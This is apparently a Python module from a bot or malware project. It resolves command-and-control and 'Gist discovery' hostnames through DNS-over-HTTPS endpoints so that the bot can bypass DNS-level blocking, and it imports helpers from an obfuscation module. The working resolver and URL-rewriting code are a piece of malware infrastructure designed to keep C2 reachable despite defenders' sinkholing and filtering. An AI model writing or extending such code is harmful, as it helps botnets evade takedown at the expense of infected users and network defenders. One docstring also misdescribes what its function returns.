import requests
import json
import logging
import threading
import time
from typing import List, Optional
from core.obfuscation import decrypt_string

class SecureResolver:
    """
    H-12: DNS-over-HTTPS (DoH) Resolver.
    
    Bypasses DNS poisoning by resolving hostnames via encrypted HTTPS 
    queries to Cloudflare or Google. This ensures the bot can find the 
    real IP addresses of C2 and Gist discovery infrastructure.
    """
    
    # DoH Endpoints (Cloudflare and Google)
    ENDPOINTS = [
        "https://1.1.1.1/dns-query",
        "https://dns.google/resolve",
        "https://9.9.9.9/dns-query"
    ]
    
    _cache = {}
    _cache_lock = threading.Lock()
    _ttl = 3600 # 1 hour cache

    @classmethod
    def resolve(cls, hostname: str) -> Optional[str]:
        """Resolve hostname to a single IP address using DoH"""
        # Check cache first
        with cls._cache_lock:
            if hostname in cls._cache:
                ip, expiry = cls._cache[hostname]
                if time.time() < expiry:
                    return ip

        # Try endpoints sequentially
        for endpoint in cls.ENDPOINTS:
            try:
                # Cloudflare/Google RFC 8484 compatible or JSON API
                params = {"name": hostname, "type": "A"}
                headers = {"Accept": "application/dns-json"}
                
                response = requests.get(endpoint, params=params, headers=headers, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    answers = data.get("Answer", [])
                    for ans in answers:
                        if ans.get("type") == 1: # Type A (IPv4)
                            ip = ans.get("data")
                            if ip:
                                with cls._cache_lock:
                                    cls._cache[hostname] = (ip, time.time() + cls._ttl)
                                return ip
            except Exception as e:
                logging.debug(f"DoH: Endpoint {endpoint} failed: {e}")
                continue
                
        return None

    @classmethod
    def get_url_with_ip(cls, url: str) -> str:
        """Replace hostname in URL with resolved IP and return (URL, HostHeader)"""
        try:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(url)
            hostname = parsed.hostname
            if not hostname: return url
            
            ip = cls.resolve(hostname)
            if not ip: return url
            
            # Reconstruct URL with IP
            netloc = ip
            if parsed.port:
                netloc += f":{parsed.port}"
                
            new_url = urlunparse((
                parsed.scheme,
                netloc,
                parsed.path,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            return new_url
        except:
            return url

secure_resolver = SecureResolver()
